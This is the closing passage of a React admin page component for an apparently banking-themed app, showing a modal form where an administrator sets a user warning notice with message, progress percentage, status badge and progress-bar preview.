                        onChange={(e) => setNoticeForm({ ...noticeForm, enabled: e.target.checked })}
                        className="sr-only peer"
                      />
                      <div className="w-11 h-6 bg-neutral-300 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-neutral-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-accent-red"></div>
                    </label>
                  </div>

                  {/* Message */}
                  <div>
                    <label className="block text-xs font-semibold text-neutral-700 mb-1">Warning Notice Message *</label>
                    <textarea
                      rows={4}
                      required
                      value={noticeForm.message}
                      onChange={(e) => setNoticeForm({ ...noticeForm, message: e.target.value })}
                      className="input-field text-sm leading-relaxed"
                      placeholder="Enter warning notice message..."
                    />
                  </div>

                  {/* Progress % and Status Label */}
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs font-semibold text-neutral-700 mb-1">Progress Percentage (%)</label>
                      <Input
                        type="number"
                        min="0"
                        max="100"
                        value={noticeForm.progress}
                        onChange={(e) => setNoticeForm({ ...noticeForm, progress: parseInt(e.target.value, 10) || 0 })}
                      />
                    </div>
                    <div>
                      <label className="block text-xs font-semibold text-neutral-700 mb-1">Status Badge Text</label>
                      <Input
                        type="text"
                        value={noticeForm.progressStatus}
                        onChange={(e) => setNoticeForm({ ...noticeForm, progressStatus: e.target.value })}
                        placeholder="e.g. 65% • Failed"
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-xs font-semibold text-neutral-700 mb-1">Progress Bar Label</label>
                    <Input
                      type="text"
                      value={noticeForm.progressLabel}
                      onChange={(e) => setNoticeForm({ ...noticeForm, progressLabel: e.target.value })}
                      placeholder="e.g. Authorization Progress"
                    />
                  </div>

                  {/* Live Preview of Progress */}
                  <div className="p-3 bg-neutral-50 rounded-bank border border-neutral-200">
                    <div className="text-xs font-semibold text-neutral-600 mb-1.5 flex justify-between">
                      <span>{noticeForm.progressLabel || 'Progress'}</span>
                      <span className="text-accent-red font-bold">{noticeForm.progressStatus || `${noticeForm.progress}%`}</span>
                    </div>
                    <div className="w-full h-3 bg-neutral-200 rounded-full overflow-hidden">
                      <div className="h-full bg-accent-red rounded-full transition-all" style={{ width: `${noticeForm.progress}%` }}></div>
                    </div>
                  </div>

                  <div className="flex justify-end space-x-3 pt-4 border-t border-neutral-200">
                    <Button variant="secondary" type="button" onClick={() => setShowNoticeModal(false)}>
                      Cancel
                    </Button>
                    <Button type="submit" disabled={actionLoading}>
                      {actionLoading ? 'Saving...' : 'Save Settings'}
                    </Button>
                  </div>
                </form>
              </div>
            </div>
          )}

        </>
      )}
    </div>
  );
};

export default AdminUsersPage;
